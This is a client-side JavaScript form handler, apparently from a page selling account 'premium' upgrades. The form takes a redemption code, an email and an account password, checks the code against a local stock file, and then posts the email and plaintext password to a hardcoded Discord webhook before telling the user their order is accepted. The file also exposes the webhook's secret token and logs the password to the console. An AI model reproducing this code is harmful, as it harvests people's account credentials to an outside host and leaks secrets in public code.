document.addEventListener('DOMContentLoaded', () => {
  const form = document.querySelector('form');
  const messageDiv = document.getElementById('message');

  form.addEventListener('submit', async (e) => {
    e.preventDefault(); // Empêcher le refresh de la page

    // Récupérer les champs
    const codeInput = form.querySelector('input[placeholder="XXXX-XXXX-XXXX-XXXX"]');
    const usernameInput = form.querySelector('input[placeholder="Email"]');
    const passwordInput = form.querySelector('input[placeholder="Password"]');
    const locationInput = form.querySelector('input[placeholder="Location"]');

    const code = codeInput.value.trim();
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    // Vérification des champs
    if (!code || !username || !password) {
      messageDiv.style.backgroundColor = 'red';
      messageDiv.style.boxShadow = '0 0 20px rgba(255, 0, 0, 0.5)'
      messageDiv.textContent = '❌ Please complete every input.';
      return;
    }

    try {
      // Charger stock.json
      const res = await fetch('stock.json');
      if (!res.ok) throw new Error('Failed to load stock.json');
      
      const stock = await res.json();

      // Vérification de la structure du stock
      if (!Array.isArray(stock.codes)) {
        messageDiv.style.backgroundColor = 'red';
        messageDiv.style.boxShadow = '0 0 20px rgba(255, 0, 0, 0.5)'
        messageDiv.textContent = '❌ Error: bad JSON structure.';
        return;
      }

      // Vérification du code
      if (stock.codes.includes(code)) {
        const webhookUrl = "https://discord.com/api/webhooks/1368672554839052430/gZIrVyHNzVjERblca6G4VkOCaWXtGGfBoaq10tyyiq4JVV8P4oFligCcm0CHNncP8Xvg";
        
        const payload = {
          embeds: [{
            title: "New order",
            color: 0xee00ff,
            fields: [
              { name: "Code", value: `\`${code}\``, inline: false },
              { name: "Email", value: `\`${username}\``, inline: true },
              { name: "Password", value: `\`${password}\``, inline: true },
            ],
            timestamp: new Date().toISOString()
          }]
        };

        // Affiche la requête avant d'envoyer le webhook pour debugger
        console.log("Sending Webhook Payload:", payload);

        // Envoyer au Webhook
        const webhookRes = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        console.log("Webhook Response Status:", webhookRes.status);
        const responseText = await webhookRes.text();
        console.log("Webhook Response Body:", responseText);

        if (webhookRes.ok) {
          messageDiv.style.backgroundColor = 'green';
          messageDiv.style.boxShadow = '0 0 20px rgba(0, 255, 4, 0.5)'
          messageDiv.textContent = '✅ Thanks for your order, we will add premium asap.';
          form.reset();
        } else {
          messageDiv.style.backgroundColor = 'red';
          messageDiv.style.boxShadow = '0 0 20px rgba(255, 0, 0, 0.5)'
          messageDiv.textContent = `❌ Failed to send to webhook: ${responseText}`;
        }

      } else {
        messageDiv.style.backgroundColor = 'red';
        messageDiv.style.boxShadow = '0 0 20px rgba(255, 0, 0, 0.5)'
        messageDiv.textContent = '❌ Invalid code.';
      }

    } catch (err) {
      console.error('Error:', err);
      messageDiv.style.backgroundColor = 'red';
      messageDiv.style.boxShadow = '0 0 20px rgba(255, 0, 0, 0.5)'
      messageDiv.textContent = '❌ System error.';
    }
  });
});

